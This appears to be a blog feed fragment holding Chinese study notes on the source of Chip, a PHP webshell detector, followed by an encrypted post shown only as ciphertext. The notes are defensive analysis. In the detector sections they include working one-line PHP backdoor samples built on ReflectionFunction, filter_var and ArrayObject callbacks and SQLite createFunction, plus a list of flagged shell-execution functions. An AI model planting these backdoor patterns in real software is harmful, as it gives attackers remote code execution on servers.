class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasDynamicExpr($name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;storage-&gt;danger($node, <span class="keyword">__CLASS__</span>, <span class="string">'动态调用方法，可能存在远程代码执行的隐患'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isName($class) || !<span class="keyword">$this</span>-&gt;isIdentifier($name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;storage-&gt;warning($node, <span class="keyword">__CLASS__</span>, <span class="string">'不规范的静态方法调用，可能存在远程代码执行的隐患'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Eval : EvalNode   process调用hasDynamicExpr()函数检测$node-&gt;expr。</p>
</li>
<li><p>Extends: Class_   process</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">($node)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ($node-&gt;extends <span class="keyword">instanceof</span> Node &amp;&amp; <span class="keyword">$this</span>-&gt;isName($node-&gt;extends)) &#123;</span><br><span class="line">          $className = $node-&gt;extends-&gt;toLowerString();</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> (in_array($className, array_map(<span class="string">'strtolower'</span>, <span class="keyword">$this</span>-&gt;dangerClassName))) &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;storage-&gt;danger($node, <span class="keyword">__CLASS__</span>, <span class="string">'代码继承了不安全的类'</span>);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要检测 类的继承  ReflectionFunction</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;?php class test extends ReflectionFunction &#123;&#125; </span><br><span class="line">  $f &#x3D; new test(&#39;system&#39;); </span><br><span class="line">$f-&gt;invoke($_POST[2333]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>FilterVar: 结点 funccall   funcname : filter、filter_var  ,然后process </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  filter_var($_REQUEST[<span class="string">'pass'</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'assert'</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]), <span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="keyword">array</span>(<span class="string">'filter'</span> =&gt; FILTER_CALLBACK, <span class="string">'options'</span> =&gt; <span class="string">'assert'</span>)));</span><br></pre></td></tr></table></figure>
</li>
<li><p>Include : 节点  Include  ，进行process()函数，首先递归找$node-&gt;expr  分两类（Concat  -字符串、Encapsed –<strong>不知</strong> ）然后判断最后的节点，若文件名不为php inc 就报danger，然后hasdynamicExpr($nodd-&gt;expr),返回真 报danger.</p>
</li>
<li><p>MbPregExec : 检测这类变形webshell，<img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200414171305419.png" alt="image-20200414171305419"></p>
<p>节点： FuncCall，然后若函数名为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">'mb_ereg_replace'</span>,</span><br><span class="line">    	<span class="string">'mbereg_replace'</span>,</span><br><span class="line">      <span class="string">'mb_eregi_replace'</span>,</span><br><span class="line">      <span class="string">'mberegi_replace'</span>,</span><br><span class="line">      <span class="string">'mb_regex_set_options'</span>,</span><br><span class="line">    <span class="string">'mbregex_set_options'</span>,</span><br></pre></td></tr></table></figure>

<p> 上面这些函数，就执行process()函数，先获得参数，然后对参数进行检测。若参数不为字符串，报danger,若参数为e，则报danger。</p>
</li>
<li><p>MethodCallback: 检测下面这类webshell , 节点  MethodCall</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// way 0</span></span><br><span class="line">  $arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line">  $arr-&gt;uasort(<span class="string">'assert'</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// way 1</span></span><br><span class="line">  $arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">  $arr-&gt;uksort(<span class="string">'assert'</span>);</span><br><span class="line">  </span><br><span class="line">  $e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">  $db = <span class="keyword">new</span> PDO(<span class="string">'sqlite:sqlite.db3'</span>);</span><br><span class="line">  $db-&gt;sqliteCreateFunction(<span class="string">'myfunc'</span>, $e, <span class="number">1</span>);</span><br><span class="line">  $sth = $db-&gt;prepare(<span class="string">"SELECT myfunc(:exec)"</span>);</span><br><span class="line">  $sth-&gt;execute(<span class="keyword">array</span>(<span class="string">':exec'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line">  </span><br><span class="line">  $e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">  $db = <span class="keyword">new</span> SQLite3(<span class="string">'sqlite.db3'</span>);</span><br><span class="line">  $db-&gt;createFunction(<span class="string">'myfunc'</span>, $e);</span><br><span class="line">  $stmt = $db-&gt;prepare(<span class="string">"SELECT myfunc(?)"</span>);</span><br><span class="line">  $stmt-&gt;bindValue(<span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>], SQLITE3_TEXT);</span><br><span class="line">$stmt-&gt;execute();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/51631434650097.png" alt="img"></p>
<p>之后获得方法名，如为下面的名称，执行process()函数，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &#39;uasort&#39;                   </span><br><span class="line">  &#39;uksort&#39;                   </span><br><span class="line">  &#39;set_local_infile_handler&#39; </span><br><span class="line">  &#39;sqlitecreateaggregate&#39;   </span><br><span class="line">  &#39;sqlitecreatecollation&#39;   </span><br><span class="line">  &#39;sqlitecreatefunction&#39;     </span><br><span class="line">  &#39;createcollation&#39;         </span><br><span class="line">  &#39;fetchall&#39;                 </span><br><span class="line">&#39;createfunction&#39;</span><br></pre></td></tr></table></figure>

<p>首先，若方法名为fetchall，先看参数是否有 <code>...</code>这种形式，若有报danger;然后检查fetchAll()的前两个参数，若通过白名单检测跳过，否则调用hasDynamicExpr()检查第二个参数，若真报danger，若第二个参数不为匿名函数报warning。</p>
<p>之后检测其他函数首先检测指定位置前的参数是否存在变长参数，若存在报danger；然后检测指定位置的参数值是否含有动态性，若有则报danger；若指定位置的参数值不为匿名函数报warning。</p>
</li>
<li><p>PregExec:  节点 funccall  ,若函数名为preg_replace或preg_filter，就执行process()函数，检测第一个参数中是否有e，若有则报danger</p>
</li>
<li><p>Reflection: 检测节点 New  ,然后获取$node-&gt;class;，若名称在下列中，报warning。reflectionclass-&gt;getDocComment()可以获取注释。reflectionfunctin-&gt;invokeargs()执行函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &#39;ReflectionClass&#39;,</span><br><span class="line">  &#39;ReflectionZendExtension&#39;,</span><br><span class="line">  &#39;ReflectionExtension&#39;,</span><br><span class="line">  &#39;ReflectionFunction&#39;,</span><br><span class="line">  &#39;ReflectionFunctionAbstract&#39;,</span><br><span class="line">  &#39;ReflectionMethod&#39;,</span><br><span class="line">&#39;ReflectionGenerator&#39;, &#x2F;&#x2F;&#x2F;和extend中一样</span><br></pre></td></tr></table></figure>
</li>
<li><p>ScriptTag: 检测<code>&lt;script&gt;</code>标签型webshell，报warning（不判断代码内容）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  object(PhpParser\Node\Stmt\InlineHTML)#1124 (2) &#123;</span><br><span class="line">    [&quot;value&quot;]&#x3D;&gt;</span><br><span class="line">    string(46) &quot;&lt;script language&#x3D;&quot;php&quot;&gt;</span><br><span class="line">echo 2222;</span><br><span class="line">&lt;&#x2F;script&gt;&quot;</span><br><span class="line">    [&quot;attributes&quot;:protected]&#x3D;&gt;</span><br><span class="line">    array(5) &#123;</span><br><span class="line">      [&quot;startLine&quot;]&#x3D;&gt;</span><br><span class="line">      int(1)</span><br><span class="line">      [&quot;startFilePos&quot;]&#x3D;&gt;</span><br><span class="line">      int(0)</span><br><span class="line">      [&quot;hasLeadingNewline&quot;]&#x3D;&gt;</span><br><span class="line">      bool(true)</span><br><span class="line">      [&quot;endLine&quot;]&#x3D;&gt;</span><br><span class="line">      int(3)</span><br><span class="line">      [&quot;endFilePos&quot;]&#x3D;&gt;</span><br><span class="line">      int(45)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; Chip\Alarm Object</span><br><span class="line">        (</span><br><span class="line">            [type] &#x3D;&gt; ScriptTag</span><br><span class="line">            [level] &#x3D;&gt; WARNING</span><br><span class="line">            [message] &#x3D;&gt; 使用不支持的PHP标签，可能存在安全问题</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>shellFunction: 同assert，只是将检测的函数名变为</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &#39;system&#39;,</span><br><span class="line">   &#39;shell_exec&#39;,</span><br><span class="line">   &#39;exec&#39;,</span><br><span class="line">   &#39;passthru&#39;,</span><br><span class="line">   &#39;popen&#39;,</span><br><span class="line">&#39;proc_open&#39;,</span><br></pre></td></tr></table></figure>

<ul>
<li><p>shell: 节点为  ShellExec  ，然后同shellfunction</p>
</li>
<li><p>StaticCallback: 检测phar:webphar 、closure::fromcallable ；节点 为 StaticCall，若{$node-&gt;class-&gt;toLowerString()}::{$node-&gt;name-&gt;toLowerString()}为phar:webphar 、closure::fromcallable，执行process()函数，若参数<code>...</code>报danger，检测参数动态性，若有动态性报danger,若未使用匿名函数，报warning.</p>
</li>
</ul>
</li>
</ul>
<h1 id="0x04-踩坑"><a href="#0x04-踩坑" class="headerlink" title="0x04 踩坑"></a>0x04 踩坑</h1><ol>
<li><p>Symfony命令行处理</p>
<p>用了application的run()方法，若不传参数会调用ArgvInput类，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArgvInput</span> <span class="keyword">extends</span> <span class="title">Input</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $tokens;</span><br><span class="line">    <span class="keyword">private</span> $parsed;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|null           $argv       An array of parameters from the CLI (in the argv format)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> InputDefinition|null $definition A InputDefinition instance</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $argv = null, InputDefinition $definition = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === $argv) &#123;</span><br><span class="line">            $argv = $_SERVER[<span class="string">'argv'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// strip the application name</span></span><br><span class="line">        array_shift($argv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;tokens = $argv;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">parent</span>::__construct($definition);</span><br><span class="line">    &#125;</span><br><span class="line">..................</span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[argv]</code>在cli模式中，为输入的东西，<code>$argv=$_SERVER[argv]</code> ,$argv[0]是脚本名，$argv[1]是第一个参数如(–11=2)，依次类推。</p>
<blockquote>
<p>arguments   ls -l  /   有两个arguments  -l  /  </p>
<p>A parameter is an argument that provides information to either the command or one of its options</p>
<p>option   对arguments的细分   -  或 – </p>
</blockquote>
</li>
<li><p>php-di</p>
<p><a href="https://blog.csdn.net/soonfly/article/details/52627683" target="_blank" rel="noopener">依赖注入参考链接</a>    php-di 文档<a href="https://link.jianshu.com/?t=http%3A%2F%2Fphp-di.org%2Fdoc%2Fgetting-start" target="_blank" rel="noopener">http://php-di.org/doc/getting-start</a></p>
<p>分为 构造函数  方法  属性   php回调注入 </p>
<blockquote>
<h3 id="3-Create-the-objects"><a href="#3-Create-the-objects" class="headerlink" title="3. Create the objects"></a>3. Create the objects</h3><p>（创建对象）<br>Without PHP-DI, we would have to “wire” the dependencies manually like this:<br>（如果没有PHP-DI，我们将不得不像这样手动地“连接”依赖项:）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$userManager = <span class="keyword">new</span> UserManager($mailer);</span><br></pre></td></tr></table></figure>

<p>Instead, we can let PHP-DI figure out the dependencies:<br>（相反，我们可以让PHP-DI计算出依赖项:）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userManager = $container-&gt;get(<span class="string">'UserManager'</span>);</span><br></pre></td></tr></table></figure>

<p>Behind the scenes, PHP-DI will create both a Mailer object and a UserManager object.<br>（在幕后，PHP-DI将创建一个Mailer对象和一个UserManager对象。）</p>
</blockquote>
</li>
<li><p>php  Trait</p>
<p>代码复用：实例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> SayWorld &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::sayHello();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();<span class="comment">//Hello World!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>









</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<p>PHP动态特性的捕捉与逃逸</p>
]]></content>
      <tags>
        <tag>Chip</tag>
      </tags>
  </entry>
  <entry>
    <title>长亭公开课笔记</title>
    <url>/2020/04/13/%E9%95%BF%E4%BA%AD%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="bebe2d2a62ba3dfda79d573e501e72308a2f6fc8b95872413dc6f075b9cf41ff">cccc15989bed4e5058499a08fac419d46b500cfff8f585b1cedb30f4ac9262168ec50e44f160a7d15b3a2ed6dc4114f847c0e1eeb63a84ac045055f68e67cfbb5c2cc640ddb1f9e81f843edbc45dfeecb1c9c0b1e233cc888f0143f0197762cf2985f725d10c43a8b41536f2819f4b1d6a306893aa528a57213698971df78c33d59e1efd61d4a58f9d4ba84d0a6c8ef46b5277860a20b4eeb94438664f724859c80252d75924e29ce29c748176d21912d217ecf58c9752662340c130a1a5b2778590f5e687e1fe18c00572bdbb1fe4f131935c9244868eeb1381ca72ce53aeb6608607278fde9f0430e70d8340a014dc33f4e031b92ad4371de11f51cb308f1897c9272201e790056767cbd8640d7abd542925ab57f66702d4d3f9aa6feb31b38b96a063e1d9f61b997955a6cdb54e418d8adce8ec127eccd65ecc9542e8f4b2c20ce0de3a52d835f95e9116b80718813f874d695397946989c9e219505214f2c733b2b6fe61081cec588267cc463f642a3a2d469e296c642fa8696f3fa3051dcd6e139db43de4ac4585e740cb3ab7f5ddb543dec2b04f788d911741e3211cb585b250c899ae762649e13447b033f6d8d321b969d197b449f0c8786a038cc18031ac35309618303f17f7575710889197b61a2c3424c4889c2c9154d3d8ddd932e41c4e7febbd84c338e08257d8493727bbbe2b3db6ba3c8aee038d33d43fd409c65c2e7147e5a65413be26b17ee122f34f503a676b2c52b0c42e9af41cd0ac9be9f80f1133edc78a8d50b5dce4aa63db8c7121fe757bd77721339dcb6abb5e141c0592d276b2defa5c12c344e1834ba478394619068a4bd0e971ddbf9d1087f800767ce6ca90fdb45655173bb823d90eff3456c8423db9715723ebfc26511cfc84e50cb957ce4d1b4fa7fe0d2fdf1c62c94a7511f43f5631f3c5039cd8dc39da47a0b601e871c5297e7d074086bb6a74158878058268a6175b24ee6fb5a15c1aff8bd95756856799457c53e41d1d119709a66da621b21949edfb6242ac5409cac23101562243d5de887fc6fb97a8e94200f5cf3843fefb36a578b140051c27cdd8a975fedb1cdacaa452dd49d759164e446b4b7cc8c673da9039ac3a8a73a5d748c536284de1a9e1aeff8a332c76122a05b2f81ff1f43f1a066ea7ff99ce8d2cd224cee6ab58397795c41b1175a7d364c951de9722ea9890f0bd29e112dc649ac0629b5ebaaa43818b8dab62046dde574ddce86ffe6d86af3b1904835661727e0822fc4c6bce37491fdc0750f431ccb732d820483be43220e4e84c7449d3d898dc5a2ec9442969b7da3ed66da932050173b8c15e13940e440da47f00e714e0ba10f191a2771840f403cd4fc286f814a551882b0f5f5ba9d28095beb78669fb9f66d9d6eca75bb7b6abec389bc64146d6b050cb096f1f51d901508ff0ab982ddc7d9a860dc2e81d1b6736c1aafaed6ecfef520e876ec93f4831f08319e29b59a5e38507c101d86e041df39c529c5cb1dce2ce8db680c51914fb6cfce6c6ca2d9de632981f6771f8bc9d12af5487139d5905cd07da995f971433015ca25cecebe3e93b507a85eecdbaa9e263f65e2dcef206768afeb02b792d5136beb3c81e84a8eea279d699f6dd39c6371633245b4daa2cebf0cd5f34b75e77e2ba17bc8cb2272135bbd5fa621959cd6ec0f06ce1a6ae86d926c349fbe64640fc3896ce05ef6d2fa56e2380cef934b6f2dd648c90e915600513c8a04142372520341f61e9dfae98ed399d34e63f3e1d95fcc9b66730df0923ee03e85a06a747319f1f8afe0f8247869b55a686719340282fab7a6882c4955fc1c26e88ca7d578a816d58c9dbda988cb568447dfec39690739fb7c8e11937dc161e58453a6d3a5aad8cd55b4245e23e02a5c279e0b0dde161205ce152ee0c596704c7eeeb7a563ea4c0af4d7c7e81e6debc311bafaf06f83fa3caf53ce25f76aa8f8f9b49694cbe330add2bb0c55bf0b313029534ba55843bfb921b16aac895acc7bd266c490be6d270acdd2be085b71c8a1278a07a6ae455d441843aa6337ebc6e8f677fab1f57c06d9bd7867c4f3a0bc56a245062b1a3cd70262b85bdc6af5c92e438a68044ba09ef9b80bda2d57b7378bead78e2f5ebc74c0a09bf1ca6b9018d2a163760add4e6c24703f5ecaa71c8fb600f1a44dab11b5ba1a5a9dd82d1e07641f605777d369604ce887ad03211d8b2e5d2a2764ca93530e08e9334fca27fa855d58b1bb39f899672f8aa99be748557a4144c7735386e79cbfa7af195cdbe131cb7a66f3e44644525d16542807e9531de2cbba2258ad0c856a0375e795fff83cca2861330ea9a64c1e06f068e2c6a649c76fe346ebf9692fedd7ed63eadc8c092b25f7034cc6e39323417d1918319319e7ae628e5d06e08e2f7c8e4ec9b293b9c4a65468d583bb0c01bee0df57093b85214f31f9a292069ec74382365e1567a9bc9a5432d23a6c82294d4d8a40dc6a394ed5a8830c05c2dcb4ae77aac040d1c0a5db2b894caa47ea8ca0a383e7aee1ef47631ff6e22d4fc5c42963e93a2ebcbc88b3c20c2e238b6c1d14fc08c88488b3d51d632f5c09af2850a522837469bd03670bf2d53a9389132214843a0f3a2faf8a5114d34ffce9a06a263100018831cbcc714ed5df1df89956f9698151912cd85fb8e87d42d1bc611105c597a1c69b22600db22df495763e9880d548cb534c37c3977a4f7547d9c6cc89443ab6204a4d6791d8fddbc8c304f0458dc1a64a3b125c19cb90c2a0d2a53c6fab82c862b1854540f6ccaddcc07f0cd6040b93eb18f9f7434e71e166d5c0254de48f6aa23c2a6e258558b817a8cf195608e8e04b11d956d0611a2ef3e4398e70c26b7d7987ef9a497f8c4667f6fa6dc560d4e51f0ff821364d9f0844d3e3a5e07cb16488571877f0b7487aa35eb720ee86e570dc250f85d95f35dfd90c5b98b8cd5682b0d7025c89375e308f4db4a3e662c5444db417e97790e21fc4ac871adf91b6cb0746f03dae16d2feb86b79bea8bd09797203883fa9bf80e23e0c9ad6dc0d4c30697947c2c5881c394fa8c721d3199732c4d649d014dcea7b3cd118dde5d490c4be75424ee49e2bcc6f0f31b25d45261b3a4f435061fd9260d1c851fb15b4b7bb300a15573df59b6cc5aa2cdf596af909ec31580aa364e45a9a6e17078a120f377d45f3d7c2df3768f4561b2c72a790e9c04f8dc3cb2004a8ca49476e4a156a77eea06f1988b684fab18ade0cbe4148a946940fadce352af6cd372eb34729c5b23befb7861995482de866ce02d9aa2c5eeed70b2433c887b0385847da5d745e88c876b21f3644d3a459b4856ce24a304560c136ea85764662bea459090ede0311e1134247af30d44803130b9204e45db50f4eb57291081fbac84b92ebff61b0f8dbbabc90b47352e8748d8c3aa7e101760a953a3b8464cf2b3cece4780cff4f3e6aadfae309eff70002c2967b7f0c5276e7af2741c1e2c3411732ef67ba0a41b590bf3e62cba5118de87ab26040dadb53bbf556c7ef1078a4053084525af96318b49fe8fee625d2bd579880da588a3e638483dcb29d2db946835eafa734a7db4d6aa55e8eff90a2d0a6aa511e6f986c4c24656092e967875084c1c1c86b19b5dbf360b0ac47f4093821c8d14637530adcfb374548ad2ded41d67a891408d7f30f9f3aab5d53e3e1283eead07c58d6cd81e005900ec8166323e9a56535ea5221d8ba3a6e76de861085edaa4a0a352dd6ccebf3f0cce7bd95f3b59f1aab981ee0c86030b9d4c48e0eb33d49dcb4de613d59e577ecfa9e86faef165e82b83184bbaefbf492dffee241163ab2c39dd840ccbc7d703c514abfa5a62be7941c301730f2f371c8470bc039afd5196bd68cc92f51531f7a47eda2f57b1c392a07a40cd8717ef7bc4e6e0094df1995cb1b10f99557cf9166ce126158738fdff3cd9ae1d3b5e106a9946288a0d59699b64d0448f3d10ec14490573ea0d9d40d8a9c24d18b622443b2fb6ce74bab6d948cdb62428ab5da9fe3942227fada4d0a15dd873e1f55a442729530e29abaa4582ff9f4b2e7aabc71428337522a3d52830d2c018147615b9c9e978b27fcff6ed4d1da1890a423a2144fb315dcc9997af87d69d372d76ee30ad80f1c1d193bc2e08e505031bc91d940f386b233f6b26254c63492a85f259c6a2aa72accef4fc344e6e0ca32dd0b348917774291eeb620d9b0dd0464085f7a319d02c417b609d71bff4ce6415e9395132fec751a616fc35df8e97e73508006d409c69ebe7f5bbeabd1f2a4e85147f8f6c78a1afeb57289e87b104f7eefd718b67271f8683fbf2c697ca5d8036cd3eff8d3222ce77d6f8613ddbd19209a2e588f06a00385ab5d274576ae664c37b47dd05754c807a2931155819f677fd0f82f1a01484d6256445add9fa3b58ce51a587eb0d6ba1ea7c27a9de4054a4cb06fc70b4fd9be73a754655e9901f37a0d7c1c43e2de946d8de20afd6e9c057a7bb0bc985208f05f3210ae528098cdfc5b67a82aa2f38f9f85d360db2e9c9fa8f353cca00382ce7e10802a08dcc9ee20d9f6f0977b7fee968c13ee5a41651686c50181b87f4760c702b81fbda012ce13588ac0af98d083b149c4360f80f27845018249a40f5c4e9fb1e1382f127bd4187a3e6e9cda3f1019fd017de3ce9d508fd9ef035555c9bff7275da2cedebc6a3325745635c4f210a181e02b42511106b77cb82f78813b9739131f520d78259f9c435503ae879c6fa1e64e57940905cd0d9ac2051d720109385a02b0066baf4413387c23b72e60b108122da49813a2fc843c3360d8284b8f91ebc2ceccb223cd65ea63bc142225b4b887f91bf755ad14e52b45330f734cec5fd0cd9da00ed449bbd541e4ff5ee9e37698c74b5a13ff08c7ce6db8e188af48d4907bce4b9bfb732ea7790cb89fe73479c6a5ee2aa07860a01bdac887e19f8c33b791c12d415680363c7a5bd884507d37a2e8e7f100c9266365f309cb44365f0d8d4fe8270e6a9ffd2ddaaa12e1db54dc6341086c31824e966a047ad92388a617f3fa31c2b93be3a301cb6d3685c3ade64ca8410b05e0375d605461e0892d12e3f00d4f0eeb5735c88faa70adf35d7ce9ff6fde09b57e779421d3e64a95faa5b0e48687e0aa6ea32450b7979e2ef2725c7267fc005dac6c076ac1a001dd784607dbbaef14a938ec2b0e2767919a211132007080f413caa587ad99986ec80cae3b4a7e7a57c5637e08d5273e5b80a211c9217a699d3da7d63481ddab231de4024001ba885098d32c4b5c774c9d5c456bf176610e0fc5720b674955c7ff50f266b247e0d5794a3f23d979bf012949c42eab9e0735d3f33fa29f73334d6e9f2a8b52a206f4e6d8da50b694292c37552a274a1d8decf50a5108cc226b52ead04f2c10ff873409c3ae18391abea7e69f8d56bd788a54150bebad72b50383cb5b41e2e496d05c2a2469713c88f1dc4af492d66168c9ddd0c6d5700f581ebafd7a72bbebc327161a00e879c38b403c7ca1943ca619a74d31461725f054d0268a0cc6ed462ade6b8407a2bcebc8a11b319edbfa180b404934b16ad38cf3b729628f8c9e06b3f87d91e706168d4d7bad9aa063037679e4f8fe05c4eacd2a1c1ec875e5b8552cafd578f83c94495f731e1f33764905fdacd98a3c8b8bd6737509e84f42896b3dea67876c71cf0c9df1563c120c846fa9c884278ed57d09e48ee004e43d4b2bd963db415473027511a34afdabc5421bc1e682d0bf5f4af04de3879cf46e5bec382ce3bcc43fd38d3ca7290ee2de3fce10d14fb5830d141c13cd5b6ef9c347472117decd4a09c3f89c660e9e026a2654056a6e8a90ebabf0a279ae3e1d36078c14733afdd37fb4ed95ea2e06d0dd04da4d069ee053351fab25c3be134a6ee9ac449362594b2c57dd635e23f4ea53a5558383fa7af5b9acd822084fade0d59836b432f5cb8e68631a4dcf191c7c585e0c1b2cdedfa837e3a01604f2a2fa890a3e14ea2c6ff137148ddbd94f3a8f7e26c62c843f7e55acc718bad7b4779170d81d8459ea6249293675cbd54f6ba2af2eec625f5679dcf5a01aa61dbc98ca27c1287224877933155f292164de9381b4a96ce95155715bbe1be36c1010299073c36b49f34fa5053cefbd261a12553344227347c57487833b4b5bbec4ed446294ab64abf128171d1351555dae95a24ce1248ad2f8d92af35eccaf77dda6305996041dff831776fcc81d999d6c116db294599e87f4fced3961a161838b172dc6b419ce2d943f244144fb1e252f180e912b49e9dfcbcee690ad84ecf4ab84c93f5c95c6ef5562c02c9a44e52b3582fef65d4267ef686fbcc4dc67ecaec7e817ac2d9fe0443e025f2d63b3150b93888765d27a1c8111ba83326f6b3bc04dc23e69e874d390a9e84ff073ef999a5bdaf99d72787301f6e1bfb492e9f26d4cd591831c9d28ccee5e3b94e0e86ff4e9f92d602e7d6a7dc9256006ab48fd5c2b36896b0c6e716cbd8809488a95f5f4cd6bb4ed21141c1f188ad40118ec0a463c1f184628479c56b4338e000ab71ff99fe35e90d073fd99fc6b70d3210a5113236c6021e840defb6be9b195b3166e1c08fd93366a997b8b6edc220ae745fd6c8168ef2deb54169bb6b98b1a9a3536f83f9d703ce4b54ce160b274e7b522fc496bc787350d50630c03381b1f85ef915827c247603cf972c146775b4dbeca542609ee2d80f9c286b3e0a18b1ccf78ffd60bc431e4d58c1b3f2757369161ec0cd81ae8049d7d29edd4dacc95df2b348006e6fff75e8cae68891fd4bc4e375f9726ba8826715677a5f9c1550769e4d1ba55d798993d7677fd2c570c5a874e6047f010eea587f27badbf1627e32d1a02b102a8e417117363f8b431b05c0df114c9292e8f5aba8a57349f1e89492e23b5663b12bde2cb42053c4645f43e226f18b87779fb96dd2511118a4b10b35f64bf1424c3ee64984579dc925fed0bdc7d202886abb70f4b4bdf23da52eb7e255b35cf4fef7dd1c85c73ad1fe46f5bca8c23c9a68986d4c5938349622901149a9e35a8b4ac9640e98c7bd0888a9cfb1deef6eda1cc60c27e87256b66a95166c1832c7f63a9ac680fbc5b64d5073c2af3c1e02171e6926cd57a